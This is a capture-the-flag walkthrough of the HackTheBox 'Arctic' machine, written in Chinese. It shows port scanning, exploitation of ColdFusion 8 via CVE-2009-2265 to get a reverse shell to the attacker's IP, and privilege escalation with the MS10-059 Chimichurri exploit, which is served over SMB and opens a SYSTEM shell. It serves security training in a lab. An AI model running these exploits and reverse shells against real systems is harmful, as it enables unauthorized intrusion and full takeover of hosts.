kali 10.10.16.5

靶机 10.10.10.11

[HTB: Arctic | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/05/19/htb-arctic.html#priv-tolis--system)

# 端口探测

```bash
nmap  -sV -sC -O  $IP -oA nmap.txt -p `nmap -sS -sU -PN -p- $IP --min-rate=8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```

```bash
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: phone|general purpose|specialized
Running (JUST GUESSING): Microsoft Windows Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# web打点

谷歌搜索 8500 端口常见服务

<img src=".\图片\Snipaste_2023-09-10_14-32-59.png" alt="Snipaste_2023-09-10_14-32-59" style="zoom:80%;" />

访问 8500 端口，浏览器和 nc 都延时了好久

<img src=".\图片\Snipaste_2023-09-10_14-34-45.png" alt="Snipaste_2023-09-10_14-34-45" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-09-10_14-37-36.png" alt="Snipaste_2023-09-10_14-37-36" style="zoom: 80%;" />

得到 cms 为 coldfusion 8



## 尝试1

```bash
└─# searchsploit coldfusion  -m 16788
```

得到 cve 2009-2265 ，于是 github 找 exp

```bash
└─# git clone https://github.com/0xConstant/CVE-2009-2265          
```

由于延时太高了，我在 exp 里修改了一下延时

```bash
└─# python exploit.py http://10.10.10.11:8500 10.10.16.5 1234
[ + ] Upload successful, uploaded to:
[>>>] http://10.10.10.11:8500/userfiles/file/ppvgleRLAE.jsp
[...] Opening the shell, hold your beer...
HTTPConnectionPool(host='10.10.10.11', port=8500): Read timed out. (read timeout=10)
```

监听

```bash
└─# nc -lvnp 1234            
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.11] 49308
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

## 尝试2

其它 searchsploit 里配合文件包含，进入后台上传文件



# 提权

内核提权

```
c:\Users\tolis\Desktop>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 §£
System Boot Time:          11/9/2023, 5:15:12 ££
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.059 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.242 MB
Virtual Memory: In Use:    1.043 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11

```

用 [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) 来枚举

```
└─# python2 windows-exploit-suggester.py --update
```

解决脚本报错

[Getting Error : please install and upgrade the python-xlrd library · Issue #43 · AonCyberLabs/Windows-Exploit-Suggester · GitHub](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/43)

powershell 使用 wget 

```powershell
wget -Uri "https://bootstrap.pypa.io/pip/2.7/get-pip.py" -OutFile "get-pip.py" 
```

python2 安装 pip

```
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py   #下载pip
python get-pip.py   #安装pip
python -m pip -V    #查看安装pip的版本
```

```bash
└─# python2 -m pip install xlrd==1.2.0 -i https://pypi.tuna.tsinghua.edu.cn/simple                           
```



终于成功使用脚本

```bash
└─# python2 windows-exploit-suggester.py  --database 2023-09-10-mssb.xls --systeminfo systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```



## MS10-059

exp 为 [windows-kernel-exploits/MS10-059](https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A Chimichurri/Compiled/Chimichurri.exe)

开启 smb 共享

```bash
└─# export PATH=/usr/share/doc/python3-impacket/examples:$PATH                                               
                                             
┌──(root💀kali)-[~/Arctic]
└─# smbserver.py share .
```

靶机下载 exp

```
net use \\10.10.16.5\share
copy \\10.10.16.5\share\Chimichurri.exe .
```



靶机运行 exp

```
Chimichurri.exe 10.10.16.5 443
```

kali 监听

```bash
└─# nc -lvnp 443             
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.11] 49586
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.


C:\ColdFusion8\runtime\bin>whoami
whoami
nt authority\system
```
